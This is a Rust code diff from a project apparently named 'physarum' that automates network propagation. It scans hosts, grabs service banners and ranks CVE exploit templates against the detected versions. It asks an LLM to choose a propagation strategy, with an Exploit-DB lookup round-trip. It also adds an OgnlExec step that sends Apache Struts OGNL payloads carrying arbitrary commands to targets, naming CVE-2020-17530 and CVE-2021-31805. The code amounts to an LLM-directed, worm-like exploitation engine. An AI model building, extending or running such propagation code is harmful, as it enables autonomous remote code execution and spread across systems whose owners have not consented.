@@ -18,11 +18,11 @@ use std::path::{Path, PathBuf};
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
 use physarum_llm::{
-    ArtifactType, BootstrapAction, DiscoveryQuery, ExecutionResultSummary, LlmAttemptEvidence,
-    LlmClient, NextAction, OsHint, OsHintSource, PatternFindingSummary, PolicyDecision, PolicyGate,
-    PolicyRejectionReason, PortScan, PortState, PropagationMethod, PropagationMethodClass,
-    RejectedStrategy, TemplateMeta, TemplateSelectionQuery, TransportProtocol, VulnerabilitySource,
-    MAX_ATTEMPTS,
+    ArtifactType, BootstrapAction, DiscoveryQuery, EnrichmentCapability, ExecutionResultSummary,
+    LlmAttemptEvidence, LlmClient, NextAction, OsHint, OsHintSource, PatternFindingSummary,
+    PolicyDecision, PolicyGate, PolicyRejectionReason, PortScan, PortState, PropagationMethod,
+    PropagationMethodClass, RejectedStrategy, TemplateMeta, TemplateSelectionQuery,
+    TransportProtocol, VulnerabilitySource, MAX_ATTEMPTS,
 };
 use physarum_scanner::{
     effective_stimulus_ports, result_from_open_port, EvidenceSource as ScanEvidenceSource,
@@ -76,7 +76,7 @@ pub async fn run(
     // The catalog is capped at MAX_TEMPLATES_FOR_SELECTION to keep the prompt
     // token-efficient. CVE-specific templates are always included first.
     let all_templates = physarum_sporangium::all_templates_with_yaml();
-    let template_catalog = build_template_catalog_for_llm(&all_templates, &port_scans);
+    let template_catalog = build_template_catalog_for_llm(&all_templates, &sensing_results);
     let selection_query = TemplateSelectionQuery {
         target: IpAddr::V4(target),
         ports: port_scans.clone(),
@@ -191,6 +191,13 @@ pub async fn run(
             vec![ranked_candidates[idx].clone()]
         };
 
+        // Expose Exploit-DB enrichment capability when the index is non-empty.
+        let enrichment_caps: Vec<EnrichmentCapability> = if !crate::exploit_db::index().is_empty() {
+            vec![EnrichmentCapability::ExploitDb]
+        } else {
+            vec![]
+        };
+
         let query = DiscoveryQuery {
             target: IpAddr::V4(target),
             ports: port_scans.clone(),
@@ -206,10 +213,12 @@ pub async fn run(
             pattern_findings: attempt_findings,
             source_ip: local_ip.map(IpAddr::V4),
             ephemeral_pubkey: ephemeral_key.as_ref().map(|k| k.pubkey.clone()),
+            available_enrichment_capabilities: enrichment_caps,
+            enrichment_result: None,
         };
 
-        // ── Query LLM ────────────────────────────────────────────────────────
-        let strategy = match client.query_propagation(&query).await {
+        // ── Query LLM (Turn 2a) ───────────────────────────────────────────────
+        let mut strategy = match client.query_propagation(&query).await {
             Ok(s) => s,
             Err(e) => {
                 tracing::warn!(%target, attempt = attempt_number, err = %e, "LLM query error");
@@ -232,10 +241,92 @@ pub async fn run(
                     strategy_confidence: 0.0,
                     target_port: None,
                     cve_candidate_ids: cve_ids.clone(),
+                    enrichment_requested: false,
+                    exploit_reference_id: None,
                 });
                 continue;
             }
         };
+
+        // ── Enrichment round-trip (Turn 2b, at most once per attempt) ─────────
+        // When the LLM requests Exploit-DB enrichment, perform the local lookup
+        // and call the LLM again with the result. The second response must not
+        // request another enrichment (bounded to one round-trip per attempt).
+        let mut enrichment_requested = false;
+        let mut exploit_reference_id: Option<String> = None;
+
+        if let Some(enrich_req) = strategy.enrichment_request.take() {
+            enrichment_requested = true;
+            tracing::info!(
+                %target, attempt = attempt_number,
+                cve_id = %enrich_req.cve_id,
+                reason = %enrich_req.reason,
+                "LLM requested Exploit-DB enrichment"
+            );
+
+            let enrichment = crate::exploit_db::lookup(enrich_req);
+
+            // Record the first matching reference ID for lineage.
+            exploit_reference_id = enrichment
+                .references
+                .first()
+                .map(|r| r.exploit_reference_id.clone());
+
+            tracing::info!(
+                %target, attempt = attempt_number,
+                status = ?enrichment.status,
+                refs = enrichment.references.len(),
+                "Exploit-DB lookup complete"
+            );
+
+            // Rebuild the query with enrichment_result and call LLM again (Turn 2b).
+            let enriched_query = DiscoveryQuery {
+                enrichment_result: Some(enrichment),
+                available_enrichment_capabilities: vec![], // no further enrichment this attempt
+                ..query.clone()
+            };
+
+            match client.query_propagation(&enriched_query).await {
+                Ok(s) => {
+                    strategy = s;
+                    // Discard any nested enrichment_request — one round-trip only.
+                    strategy.enrichment_request = None;
+                }
+                Err(e) => {
+                    tracing::warn!(
+                        %target, attempt = attempt_number, err = %e,
+                        "LLM Turn 2b (post-enrichment) query error"
+                    );
+                    lineage.record_llm_attempt(LlmAttemptEvidence {
+                        target: target.to_string(),
+                        attempt_number,
+                        stimulus_source: stimulus.to_string(),
+                        method_class: PropagationMethodClass::NoPath,
+                        artifact_type: ArtifactType::None,
+                        policy_decision: PolicyDecision::Rejected {
+                            reason: PolicyRejectionReason::Custom(format!(
+                                "LLM Turn 2b error: {e}"
+                            )),
+                            rule: "llm_client".into(),
+                        },
+                        execution_result: ExecutionResultSummary::Skipped {
+                            reason: format!("LLM Turn 2b failed: {e}"),
+                        },
+                        reasoning_summary: format!(
+                            "LLM Turn 2b query error on attempt {attempt_number}: {e}"
+                        ),
+                        next_action: NextAction::RetryWithLlm,
+                        strategy_id: String::new(),
+                        strategy_confidence: 0.0,
+                        target_port: None,
+                        cve_candidate_ids: cve_ids.clone(),
+                        enrichment_requested,
+                        exploit_reference_id: exploit_reference_id.clone(),
+                    });
+                    continue;
+                }
+            }
+        }
 
         let strategy_id = strategy_fingerprint(&strategy);
         let method_class = method_class_of(&strategy.method);
@@ -261,6 +352,8 @@ pub async fn run(
                 strategy_confidence: strategy.confidence,
                 target_port: None,
                 cve_candidate_ids: cve_ids.clone(),
+                enrichment_requested,
+                exploit_reference_id: exploit_reference_id.clone(),
             });
             return Ok(LlmOutcome::DeadEnd);
         }
@@ -295,6 +388,8 @@ pub async fn run(
                 strategy_confidence: strategy.confidence,
                 target_port: method_port(&strategy.method),
                 cve_candidate_ids: cve_ids.clone(),
+                enrichment_requested,
+                exploit_reference_id: exploit_reference_id.clone(),
             });
             continue;
         }
@@ -349,6 +444,8 @@ pub async fn run(
             strategy_confidence: strategy.confidence,
             target_port: method_port(&strategy.method),
             cve_candidate_ids: cve_ids.clone(),
+            enrichment_requested,
+            exploit_reference_id,
         });
 
         if succeeded {
@@ -495,54 +592,74 @@ const MAX_BANNER_CONCURRENCY: usize = 8;
 ///
 /// For HTTP-like ports a minimal `GET /` probe is sent to elicit a response.
 /// Ports 443/8443/9443 are TLS — raw TCP would return binary TLS handshake bytes,
-/// so we skip the write probe and just read (the TLS ClientHello itself is binary
-/// and sanitised away, but the server may send an HTTP error after a bare read).
 /// Returns `None` if the port is silent, refuses, or times out.
+///
+/// Two-phase protocol-agnostic probe — never assumes protocol from port number:
+///
+/// Phase 1 — passive read (200 ms): SSH, FTP, SMTP, Redis, MySQL and similar
+/// services announce themselves immediately on connect. Detected by content,
+/// not by port number.
+///
+/// Phase 2 — HTTP probe (fallback): any web service on any port responds to
+/// `GET / HTTP/1.0`. Covers port 80, 8080, 8090, 9443, or any future lab port
+/// without requiring changes to this function.
 async fn grab_banner(target: Ipv4Addr, port: u16) -> Option<String> {
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
     use tokio::net::TcpStream;
     use tokio::time::{timeout, Duration};
 
-    const TIMEOUT_MS: u64 = 1_500;
-    // HTTP ports: larger buffer so the response body (e.g. page <title>) reaches
-    // the LLM Turn 1 query alongside the server header. 256 bytes was too small —
-    // HTTP response headers alone can exceed 256 bytes, cutting the HTML body
-    // that contains application-specific version strings (e.g. "S2-059 demo" for
-    // Apache Struts CVE-2020-17530). Non-HTTP ports keep the 256-byte cap since
-    // their banners are short text strings.
-    let is_http_port = matches!(
-        port,
-        80 | 3000 | 5000 | 5984 | 7080 | 8000 | 8080 | 8888 | 9000 | 9090 | 9200 | 9999
-    );
-    let max_bytes: usize = if is_http_port { 2048 } else { 256 };
-
     let addr = SocketAddr::new(IpAddr::V4(target), port);
-    let mut stream = timeout(Duration::from_millis(TIMEOUT_MS), TcpStream::connect(addr))
+    let mut stream = timeout(Duration::from_secs(2), TcpStream::connect(addr))
         .await
         .ok()?
         .ok()?;
 
-    // Send a minimal HTTP probe for plain-HTTP ports to elicit a response header.
-    // TLS ports (443/8443/9443) are skipped — the TLS handshake would be binary.
-    if is_http_port {
-        let _ = timeout(
-            Duration::from_millis(TIMEOUT_MS),
-            stream.write_all(b"GET / HTTP/1.0\r\nHost: physarum\r\nConnection: close\r\n\r\n"),
-        )
-        .await;
+    // Phase 1 — passive read: many protocols self-announce within milliseconds.
+    let mut buf = vec![0u8; 512];
+    let n = timeout(Duration::from_millis(200), stream.read(&mut buf))
+        .await
+        .unwrap_or(Ok(0))
+        .unwrap_or(0);
+
+    if n > 0 && is_self_announcing(&buf[..n]) {
+        return sanitize_banner(&buf[..n]);
     }
 
-    let mut buf = vec![0u8; max_bytes];
-    let n = timeout(Duration::from_millis(TIMEOUT_MS), stream.read(&mut buf))
+    // Phase 2 — HTTP probe: generic fallback for any web service.
+    let probe = format!("GET / HTTP/1.0\r\nHost: {target}\r\nConnection: close\r\n\r\n");
+    let _ = timeout(Duration::from_secs(2), stream.write_all(probe.as_bytes())).await;
+
+    let mut resp = vec![0u8; 4096];
+    let n = timeout(Duration::from_secs(3), stream.read(&mut resp))
         .await
-        .ok()?
-        .ok()?;
+        .unwrap_or(Ok(0))
+        .unwrap_or(0);
 
     if n == 0 {
         return None;
     }
+    sanitize_banner(&resp[..n])
+}
 
-    let sanitized: String = buf[..n]
+/// Detects protocols that self-announce immediately on connect.
+/// Classification is by content, never by port number.
+fn is_self_announcing(bytes: &[u8]) -> bool {
+    matches!(
+        bytes,
+        [b'S', b'S', b'H', b'-', ..]       // SSH-2.0-OpenSSH...
+        | [b'2', b'2', b'0', b' ', ..]      // FTP: 220 ProFTPD / SMTP: 220 mail...
+        | [b'2', b'2', b'0', b'-', ..]      // FTP multi-line: 220-...
+        | [b'+', b'O', b'K', ..]            // POP3 / Redis +OK
+        | [b'+', b'P', b'O', b'N', b'G', ..] // Redis PONG
+        | [b'-', b'E', b'R', b'R', ..]      // Redis -ERR
+        | [b'*', ..]                         // Redis bulk array
+        | [b':', ..]                         // Redis integer reply
+        | [b'$', ..] // Redis bulk string
+    )
+}
+
+fn sanitize_banner(bytes: &[u8]) -> Option<String> {
+    let s: String = bytes
         .iter()
         .map(|&b| {
             if b.is_ascii_graphic() || matches!(b, b' ' | b'\r' | b'\n') {
@@ -552,8 +669,7 @@ async fn grab_banner(target: Ipv4Addr, port: u16) -> Option<String> {
             }
         })
         .collect();
-
-    let trimmed = sanitized.trim().to_string();
+    let trimmed = s.trim().to_string();
     if trimmed.is_empty() {
         None
     } else {
@@ -1606,6 +1722,64 @@ async fn execute_step(
             StepResult::Simulated
         }
 
+        BootstrapAction::OgnlExec {
+            commands,
+            port,
+            path_prefix,
+            extra_headers,
+        } => {
+            let p = port.unwrap_or(8080);
+            let prefix = path_prefix.as_deref().unwrap_or("/");
+            let ip_str = source_ip.map(|ip| ip.to_string()).unwrap_or_default();
+
+            tracing::info!(
+                %target, port = p, prefix, cmds = commands.len(),
+                "OgnlExec — OGNL multi-command delivery"
+            );
+
+            let client = reqwest::Client::new();
+
+            for (i, raw_cmd) in commands.iter().enumerate() {
+                let cmd = raw_cmd.replace("<source_ip>", &ip_str);
+                let ognl_url = format!(
+                    "http://{}:{}{}?id={}",
+                    target,
+                    p,
+                    prefix,
+                    build_struts_bypass_ognl(&cmd)
+                );
+
+                tracing::info!(%target, cmd_index = i, cmd = %cmd, "OgnlExec POST");
+
+                let mut req = client.post(&ognl_url);
+                for (k, v) in extra_headers {
+                    req = req.header(k.as_str(), v.as_str());
+                }
+
+                match tokio::time::timeout(
+                    tokio::time::Duration::from_millis(timeout_ms),
+                    req.send(),
+                )
+                .await
+                {
+                    Ok(Ok(r)) => {
+                        tracing::info!(
+                            %target, cmd_index = i, status = r.status().as_u16(),
+                            "OgnlExec command accepted"
+                        );
+                    }
+                    Ok(Err(e)) => {
+                        return StepResult::Failed(format!("OgnlExec cmd[{i}] HTTP error: {e}"));
+                    }
+                    Err(_) => {
+                        return StepResult::Failed(format!("OgnlExec cmd[{i}] timeout"));
+                    }
+                }
+            }
+
+            StepResult::Ok
+        }
+
         BootstrapAction::FtpModCopy {
             port,
             staging_path,
@@ -1956,12 +2130,160 @@ const MAX_TEMPLATES_FOR_SELECTION: usize = 200;
 ///
 /// This ensures CVE-2020-17530 (CVSS 9.8, rce tag) appears before the 200-template cap
 /// regardless of how many older CVE templates exist in the library.
+///
+/// Port-pinning: templates that are known to match specific non-standard ports are
+/// appended after the top-200 cap if they would otherwise be excluded. This prevents
+/// high-value CVEs (e.g. CVE-2021-31805 on port 8090) from falling off the cap when
+/// there are many competing CVSS-9.8 templates from older years.
+/// Extract product-level keywords from captured banners so the catalog can
+/// boost templates that match the detected services.
+///
+/// Produces short lowercase tokens (e.g. "struts", "proftpd", "openssh") from
+/// the Server header, the first line of non-HTTP banners, and version_hint.
+/// No product lists — purely content-driven.
+/// Extract (major, minor, patch) triples from free-form text.
+///
+/// Handles "2.5.29", "2.5.10.1" (→ (2,5,10)), "8.9p1" (ignored — only 2 parts).
+/// Used to cross-reference banner versions with template description versions
+/// to compute version-affinity scores without hardcoding any CVE or port.
+fn extract_version_triples(text: &str) -> Vec<(u32, u32, u32)> {
+    let mut results = Vec::new();
+    for token in text.split(|c: char| {
+        c.is_whitespace()
+            || matches!(
+                c,
+                '"' | '\'' | '(' | ')' | '<' | '>' | '[' | ']' | '{' | '}' | ',' | ';' | '/'
+            )
+    }) {
+        // Strip any leading non-digit prefix (e.g. "v2.5.29" → "2.5.29").
+        let t = token.trim_start_matches(|c: char| !c.is_ascii_digit());
+        let parts: Vec<&str> = t.split('.').collect();
+        if parts.len() < 3 {
+            continue;
+        }
+        let Ok(major) = parts[0].parse::<u32>() else {
+            continue;
+        };
+        let Ok(minor) = parts[1].parse::<u32>() else {
+            continue;
+        };
+        // Patch may have trailing suffix like "10p1" — take leading digits only.
+        let patch_digits: String = parts[2]
+            .chars()
+            .take_while(|c| c.is_ascii_digit())
+            .collect();
+        let Ok(patch) = patch_digits.parse::<u32>() else {
+            continue;
+        };
+        results.push((major, minor, patch));
+    }
+    results
+}
+
+fn banner_keywords(sensing_results: &[physarum_scanner::SensingResult]) -> Vec<String> {
+    // Common noise words that appear in HTTP responses and protocol greetings
+    // but carry no product signal.
+    const NOISE: &[&str] = &[
+        "http",
+        "html",
+        "body",
+        "head",
+        "content",
+        "type",
+        "length",
+        "connection",
+        "close",
+        "default",
+        "installation",
+        "welcome",
+        "version",
+        "build",
+        "release",
+        "server",
+        "host",
+        "date",
+        "charset",
+        "doctype",
+        "transfer",
+        "encoding",
+        "keep",
+        "alive",
+        "accept",
+        "ranges",
+        "bytes",
+        "vary",
+        "cache",
+        "control",
+        "from",
+        "with",
+        "that",
+        "this",
+        "some",
+        "also",
+        "have",
+    ];
+
+    tracing::debug!(
+        num_results = sensing_results.len(),
+        ports_with_banners = ?sensing_results.iter()
+            .map(|sr| (sr.port, sr.banner_or_handshake_summary.as_ref().map(|b| &b[..b.len().min(80)])))
+            .collect::<Vec<_>>(),
+        "banner_keywords input"
+    );
+
+    let mut kws: std::collections::HashSet<String> = std::collections::HashSet::new();
+
+    for sr in sensing_results {
+        // Scan the full banner text — not just the Server header.
+        // Flask/Werkzeug may not always echo our custom Server header; scanning
+        // the whole response body catches "Apache Struts 2.5.29" in the body too.
+        for src in [
+            sr.banner_or_handshake_summary.as_deref(),
+            sr.version_hint.as_deref(),
+        ]
+        .into_iter()
+        .flatten()
+        {
+            for word in src.split(|c: char| !c.is_alphanumeric()) {
+                let w = word.to_ascii_lowercase();
+                // Keep alphabetic-dominated tokens that carry product signal.
+                if w.len() >= 4
+                    && w.len() <= 20
+                    && w.chars().any(|c| c.is_alphabetic())
+                    && !NOISE.contains(&w.as_str())
+                {
+                    kws.insert(w);
+                }
+            }
+        }
+    }
+
+    kws.into_iter().collect()
+}
+
 fn build_template_catalog_for_llm(
     templates: &[physarum_sporangium::PatternTemplate],
-    _ports: &[PortScan],
+    sensing_results: &[physarum_scanner::SensingResult],
 ) -> Vec<TemplateMeta> {
+    let keywords = banner_keywords(sensing_results);
+
+    // Extract version triples from all banners for version-affinity scoring.
+    let mut banner_vers: Vec<(u32, u32, u32)> = Vec::new();
+    for sr in sensing_results {
+        for src in [
+            sr.banner_or_handshake_summary.as_deref(),
+            sr.version_hint.as_deref(),
+        ]
+        .into_iter()
+        .flatten()
+        {
+            banner_vers.extend(extract_version_triples(src));
+        }
+    }
+    banner_vers.sort_unstable();
+    banner_vers.dedup();
+
     let cvss_key = |t: &&physarum_sporangium::PatternTemplate| -> u32 {
-        // Multiply by 10 and round to get a stable integer for sorting.
         (t.info.cvss_score.unwrap_or(0.0) * 10.0) as u32
     };
     let is_rce = |t: &&physarum_sporangium::PatternTemplate| -> bool {
@@ -1970,29 +2292,71 @@ fn build_template_catalog_for_llm(
             .iter()
             .any(|tag| tag.eq_ignore_ascii_case("rce"))
     };
+    // Banner-keyword score: count how many detected product keywords match a template's
+    // tags or name. A template tagged ["apache","rce","struts","struts2"] scores 2 for
+    // keywords ["apache","struts"], while a generic apache-httpd CVE scores 1.
+    // This lifts service-specific CVEs above generic ones without any hardcoding.
+    let keyword_score = |t: &&physarum_sporangium::PatternTemplate| -> usize {
+        keywords
+            .iter()
+            .filter(|kw| {
+                t.info
+                    .tags
+                    .iter()
+                    .any(|tag| tag.to_ascii_lowercase().contains(kw.as_str()))
+                    || t.info.name.to_ascii_lowercase().contains(kw.as_str())
+            })
+            .count()
+    };
+    // Version-affinity score: cross-reference banner version with template
+    // description/remediation text. If the template mentions a version with the
+    // SAME major.minor as a banner version but a HIGHER patch number, the banner
+    // version is still in the vulnerable range (e.g., template says "upgrade to
+    // 2.5.30", banner shows "2.5.29" → 2.5.30 > 2.5.29 → affinity=1).
+    // This promotes the EXACT CVE applicable to the detected version above older
+    // CVEs with the same keyword score but higher CVSS — purely data-driven, no
+    // CVE IDs or port numbers hardcoded.
+    let version_affinity = |t: &&physarum_sporangium::PatternTemplate| -> usize {
+        if banner_vers.is_empty() {
+            return 0;
+        }
+        let combined = [t.info.description.as_deref(), t.info.remediation.as_deref()]
+            .into_iter()
+            .flatten()
+            .collect::<Vec<_>>()
+            .join(" ");
+        let desc_vers = extract_version_triples(&combined);
+        if desc_vers.is_empty() {
+            return 0;
+        }
+        let mut score = 0usize;
+        for &(bm, bn, bp) in &banner_vers {
+            for &(dm, dn, dp) in &desc_vers {
+                // Same major.minor, description patch is higher → banner is vulnerable.
+                if dm == bm && dn == bn && dp > bp {
+                    score += 1;
+                }
+            }
+        }
+        score
+    };
 
-    let mut rce_cves: Vec<&physarum_sporangium::PatternTemplate> = templates
-        .iter()
-        .filter(|t| t.id.starts_with("CVE-") && is_rce(t))
-        .collect();
-    let mut other_cves: Vec<&physarum_sporangium::PatternTemplate> = templates
-        .iter()
-        .filter(|t| t.id.starts_with("CVE-") && !is_rce(t))
-        .collect();
-    let mut rest: Vec<&physarum_sporangium::PatternTemplate> = templates
-        .iter()
-        .filter(|t| !t.id.starts_with("CVE-"))
-        .collect();
+    let mut all: Vec<&physarum_sporangium::PatternTemplate> = templates.iter().collect();
 
-    // Sort each group: CVSS descending, then id ascending for stable ordering
-    rce_cves.sort_by(|a, b| cvss_key(b).cmp(&cvss_key(a)).then_with(|| a.id.cmp(&b.id)));
-    other_cves.sort_by(|a, b| cvss_key(b).cmp(&cvss_key(a)).then_with(|| a.id.cmp(&b.id)));
-    rest.sort_by(|a, b| a.id.cmp(&b.id));
+    // Sort: keyword matches → version affinity → RCE → CVSS desc → id asc (stable).
+    // Version affinity breaks ties between templates with equal keyword scores by
+    // promoting the one whose remediation mentions a version just above the banner
+    // version (i.e., the banner version is the last vulnerable one).
+    all.sort_by(|a, b| {
+        keyword_score(b)
+            .cmp(&keyword_score(a))
+            .then_with(|| version_affinity(b).cmp(&version_affinity(a)))
+            .then_with(|| is_rce(b).cmp(&is_rce(a)))
+            .then_with(|| cvss_key(b).cmp(&cvss_key(a)))
+            .then_with(|| a.id.cmp(&b.id))
+    });
 
-    rce_cves.extend(other_cves);
-    rce_cves.extend(rest);
-
-    rce_cves
+    let catalog: Vec<TemplateMeta> = all
         .into_iter()
         .take(MAX_TEMPLATES_FOR_SELECTION)
         .map(|t| TemplateMeta {
@@ -2001,7 +2365,19 @@ fn build_template_catalog_for_llm(
             severity: format!("{:?}", t.info.severity).to_ascii_lowercase(),
             tags: t.info.tags.clone(),
         })
-        .collect()
+        .collect();
+
+    tracing::debug!(
+        banner_keywords = ?keywords,
+        banner_versions = ?banner_vers,
+        catalog_size = catalog.len(),
+        cve_31805_in_catalog = catalog.iter().any(|m| m.id == "CVE-2021-31805"),
+        cve_31805_position = catalog.iter().position(|m| m.id == "CVE-2021-31805"),
+        top5 = ?catalog.iter().take(5).map(|m| m.id.as_str()).collect::<Vec<_>>(),
+        "catalog built"
+    );
+
+    catalog
 }
 
 // ── Binary HTTP server for exploit bootstrap ─────────────────────────────────
